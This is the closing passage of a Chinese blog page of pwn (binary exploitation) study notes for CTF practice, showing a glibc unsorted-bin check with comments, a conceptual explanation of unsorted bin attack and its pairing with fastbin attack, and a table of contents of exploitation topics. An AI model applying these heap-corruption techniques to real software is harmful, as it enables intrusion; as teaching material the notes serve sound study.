<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// victim为freechunk</span></span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line"><span class="comment">//unsorted_chunks (av) 是一个函数调用，它用于获取glibc中分配器（malloc实现）中的&quot;unsorted bin&quot;（未排序的空闲块链表）的地址。</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>要实现修改任意地址，需要先利用 UAF 等漏洞修改待取出 chunk 的 bk 指针为 target 地址，如下图：</p>
<img src="/2023/12/08/Pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unsorted_bin_attack.PNG" class="">

<h4 id="与-fastbin-attack-配合使用"><a href="#与-fastbin-attack-配合使用" class="headerlink" title="与 fastbin attack 配合使用"></a>与 fastbin attack 配合使用</h4><p>fastbin attack 中构造堆块时，需要将目标地址的 size 数值处写入一个 0x7f 的数值才能够过滤掉系统的检测，如果没有方法写入，就可以利用 unsortedbin attack，将构造堆块的地址作为 unsortedbin attack 的 target 地址，那么就可以实现在指定位置处写入 0x7f 的数值了。</p>
<h3 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h3><p>Tcache 是 libc-2.26 加入的新机制，本意上是为了加快内存的分配，但是安全性有所降低。</p>
</section>
    <!-- Tags START -->
    
      <div class="tags">
        <span>Tags:</span>
        
  <a href="/tags#CTF" >
    <span class="tag-code">CTF</span>
  </a>

      </div>
    
    <!-- Tags END -->
    <!-- NAV START -->
    
  <div class="nav-container">
    <!-- reverse left and right to put prev and next in a more logic postition -->
    
      <a class="nav-left" href="/2023/12/08/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
        <span class="nav-arrow">← </span>
        
          C语言学习笔记
        
      </a>
    
    
  </div>

    <!-- NAV END -->
    <!-- 打赏 START -->
    
    <!-- 打赏 END -->
    <!-- 二维码 START -->
    
    <!-- 二维码 END -->
    
      <!-- Utterances START -->
      <div id="utterances"></div>
      <script src="https://utteranc.es/client.js"
        repo=""
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async></script>    
      <!-- Utterances END -->
    
  </article>
  <!-- Article END -->
  <!-- Catalog START -->
  
    <aside class="catalog-container">
  <div class="toc-main">
    <strong class="toc-title">Catalog</strong>
    
      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%94%BB%E5%87%BB%E6%A6%82%E8%A6%81"><span class="toc-nav-text">攻击概要</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#shellcode"><span class="toc-nav-text">shellcode</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#shellcode-%E7%BC%96%E5%86%99"><span class="toc-nav-text">shellcode 编写</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3"><span class="toc-nav-text">问题及解决</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90"><span class="toc-nav-text">使用工具快速生成</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9Amrctf2020-shellcode"><span class="toc-nav-text">例题1：mrctf2020_shellcode</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%9Aciscn-2019-s-9"><span class="toc-nav-text">例题2：ciscn_2019_s_9</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80"><span class="toc-nav-text">二进制基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5"><span class="toc-nav-text">程序的编译和链接</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-nav-text">可执行文件</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ELF-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-nav-text">ELF 文件结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A3%81%E7%9B%98%E4%B8%AD%E7%9A%84-ELF%EF%BC%88%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%89%E5%92%8C-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84-ELF%EF%BC%88%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%98%A0%E5%83%8F%EF%BC%89"><span class="toc-nav-text">磁盘中的 ELF（可执行文件）和 内存中的 ELF（进程内存映像）</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%BB%84%E7%BB%87%E7%9A%84%EF%BC%9F"><span class="toc-nav-text">程序数据是如何在内存中组织的？</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F"><span class="toc-nav-text">大端序和小端序</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CPU-%E5%92%8C-%E5%86%85%E5%AD%98%E9%85%8D%E5%90%88%E6%89%A7%E8%A1%8C%E6%95%B0%E6%8D%AE"><span class="toc-nav-text">CPU 和 内存配合执行数据</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%9A%84%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%EF%BC%88%EF%BC%9F%EF%BC%89"><span class="toc-nav-text">动态链接的程序的执行过程（？）</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%B1%87%E7%BC%96"><span class="toc-nav-text">汇编</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%80%E7%94%A8-libc-%E7%89%88%E6%9C%AC"><span class="toc-nav-text">查看文件所用 libc 版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80"><span class="toc-nav-text">栈溢出基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%BB%E8%A6%81%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-nav-text">主要的寄存器</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%BC%80%E5%A7%8B"><span class="toc-nav-text">函数调用开始</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BB%93%E6%9D%9F"><span class="toc-nav-text">函数调用结束</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%A6%81%E7%82%B9"><span class="toc-nav-text">要点</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-nav-text">缓冲区溢出</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#canary%E7%BB%95%E8%BF%87"><span class="toc-nav-text">canary绕过</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#canary"><span class="toc-nav-text">canary</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-nav-text">绕过姿势</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary"><span class="toc-nav-text">格式化字符串泄露canary</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#stack-smash"><span class="toc-nav-text">stack smash</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Awdb2018-guess%EF%BC%88%E7%BD%91%E9%BC%8E%E6%9D%AF2018%EF%BC%89"><span class="toc-nav-text">例题：wdb2018_guess（网鼎杯2018）</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E7%9A%84%E7%88%86%E7%A0%B4"><span class="toc-nav-text">多进程下的爆破</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#pid-t-fork-void-%E5%87%BD%E6%95%B0"><span class="toc-nav-text">pid_t fork(void) 函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PIE"><span class="toc-nav-text">PIE</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#partial-writing"><span class="toc-nav-text">partial writing</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2-PIE-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-nav-text">泄露 PIE 基地址</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2xxx"><span class="toc-nav-text">ret2xxx</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ROP"><span class="toc-nav-text">ROP</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ret2text"><span class="toc-nav-text">ret2text</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9Ajarvisoj-level2"><span class="toc-nav-text">例题1：jarvisoj_level2</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%9Ajarvisoj-level2-x64"><span class="toc-nav-text">例题2：jarvisoj_level2_x64</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ret2shellcode"><span class="toc-nav-text">ret2shellcode</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9Ajarvisoj-level1"><span class="toc-nav-text">例题1：jarvisoj_level1</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ret2syscall"><span class="toc-nav-text">ret2syscall</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9Ainndy-rop"><span class="toc-nav-text">例题1：inndy_rop</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%E3%80%81%E8%87%AA%E5%B7%B1%E5%AE%9E%E7%8E%B0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-nav-text">方法一、自己实现系统调用</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E3%80%81%E5%AF%B9%E4%BA%8E%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%9A%84%E7%A8%8B%E5%BA%8F%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90ropchain"><span class="toc-nav-text">方法二、对于静态链接的程序使用工具直接生成ropchain</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ret2libc"><span class="toc-nav-text">ret2libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9Ajarvisoj-level1-%E4%BA%8C%E8%A7%A3"><span class="toc-nav-text">例题1：jarvisoj_level1 二解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ret2csu"><span class="toc-nav-text">ret2csu</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0-ROP-%E9%93%BE%EF%BC%9F"><span class="toc-nav-text">如何构造 ROP 链？</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9A%E8%92%B8%E7%B1%B3-linux-x64-level5"><span class="toc-nav-text">例题1：蒸米 linux_x64 level5</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-text">总结</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB-stack-pivot"><span class="toc-nav-text">栈迁移-stack pivot</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SROP"><span class="toc-nav-text">SROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-nav-text">原理</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Aciscn-2019-s-3"><span class="toc-nav-text">例题：ciscn_2019_s_3</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-nav-text">格式化字符串</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"><span class="toc-nav-text">基本格式</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%80%E4%BA%9B%E4%B8%BE%E4%BE%8B"><span class="toc-nav-text">一些举例</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#c"><span class="toc-nav-text">%c</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#p"><span class="toc-nav-text">%p</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#s"><span class="toc-nav-text">%s</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#n-hn-hhn"><span class="toc-nav-text">%n,%hn,%hhn</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#a"><span class="toc-nav-text">%a</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-nav-text">原理</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#32%E4%BD%8D"><span class="toc-nav-text">32位</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#64%E4%BD%8D"><span class="toc-nav-text">64位</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Awdb-2018-2nd-easyfm"><span class="toc-nav-text">例题：wdb_2018_2nd_easyfm</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#sandbox"><span class="toc-nav-text">sandbox</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-nav-text">沙箱</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Seccomp"><span class="toc-nav-text">Seccomp</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1"><span class="toc-nav-text">绕过沙箱</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8"><span class="toc-nav-text">堆利用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A0%86"><span class="toc-nav-text">堆</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-nav-text">数据结构</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#chunk"><span class="toc-nav-text">chunk</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%BE%AE%E8%A7%82%E7%BB%93%E6%9E%84"><span class="toc-nav-text">微观结构</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#bin"><span class="toc-nav-text">bin</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#fast-bin"><span class="toc-nav-text">fast bin</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#small-bin"><span class="toc-nav-text">small bin</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#large-bin"><span class="toc-nav-text">large bin</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#unsorted-bin"><span class="toc-nav-text">unsorted bin</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#top-chunk"><span class="toc-nav-text">top chunk</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#last-remainder"><span class="toc-nav-text">last remainder</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#arena"><span class="toc-nav-text">arena</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#heap-info"><span class="toc-nav-text">heap_info</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#malloc-state"><span class="toc-nav-text">malloc_state</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A0%86%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-nav-text">堆的实现</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#UAF"><span class="toc-nav-text">UAF</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Aactf-2019-babyheap"><span class="toc-nav-text">例题：actf_2019_babyheap</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#unlink"><span class="toc-nav-text">unlink</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-nav-text">原理</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BC%AA%E9%80%A0%E8%BF%87%E7%A8%8B%EF%BC%88%E4%BB%A564%E4%BD%8D%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-nav-text">伪造过程（以64位为例）</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Ahitcontraining-unlink"><span class="toc-nav-text">例题：hitcontraining_unlink</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-nav-text">利用过程：</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#off-by-xxx"><span class="toc-nav-text">off by xxx</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Fastbin-attack"><span class="toc-nav-text">Fastbin attack</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#fast-bin-double-free"><span class="toc-nav-text">fast bin double free</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Awustctf2020-easyfast"><span class="toc-nav-text">例题：wustctf2020_easyfast</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Unsorted-bin-leak"><span class="toc-nav-text">Unsorted bin leak</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Unsorted-bin-attack"><span class="toc-nav-text">Unsorted bin attack</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%B8%8E-fastbin-attack-%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8"><span class="toc-nav-text">与 fastbin attack 配合使用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Tcache-attack"><span class="toc-nav-text">Tcache attack</span></a></li></ol></li></ol>
    
  </div>
</aside>
  
  <!-- Catalog END -->
</main>

<script>
  (function () {
    var url = 'http://example.com/2023/12/08/Pwn-学习笔记/';
    var banner = ''
    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
      $('#article-banner').css({
        'background-image': 'url(' + banner + ')'
      })
    } else {
      $('#article-banner').geopattern(url)
    }
    $('.header').removeClass('fixed-header')

    // error image
    $(".markdown-content img").on('error', function() {
      $(this).attr('src', '/css/images/error_icon.png')
      $(this).css({
        'cursor': 'default'
      })
    })

    // zoom image
    $(".markdown-content img").on('click', function() {
      var src = $(this).attr('src')
      if (src !== '/css/images/error_icon.png') {
        var imageW = $(this).width()
        var imageH = $(this).height()

        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
        zoom = zoom < 1 ? 1 : zoom
        zoom = zoom > 2 ? 2 : zoom
        var transY = (($(window).height() - imageH) / 2).toFixed(2)

        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
        $('.image-view-wrap').addClass('wrap-active')
        $('.image-view-wrap img').css({
          'width': `${imageW}`,
          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
        })
        $('html').css('overflow', 'hidden')

        $('.image-view-wrap').on('click', function() {
          $(this).remove()
          $('html').attr('style', '')
        })
      }
    })
  })();
</script>







    <div class="scroll-top">
  <span class="arrow-icon"></span>
</div>
    <footer class="app-footer">
  <p class="copyright">
    &copy; 2023 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
    <br>
    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
    
  </p>
</footer>

<script>
  function async(u, c) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
</script>
<script>
  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
    FastClick.attach(document.body);
  })
</script>

<script>
  var hasLine = 'true';
  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
    $('figure pre').each(function(i, block) {
      var figure = $(this).parents('figure');
      if (hasLine === 'false') {
        figure.find('.gutter').hide();
      }
      hljs.configure({useBR: true});
      var lang = figure.attr('class').split(' ')[1] || 'code';
      var codeHtml = $(this).html();
      var codeTag = document.createElement('code');
      codeTag.className = lang;
      codeTag.innerHTML = codeHtml;
      $(this).attr('class', '').empty().html(codeTag);
      figure.attr('data-lang', lang.toUpperCase());
      hljs.highlightBlock(block);
    });
  })
</script>
<!-- Baidu Tongji -->


<script src="/js/script.js"></script>


  </body>
</html>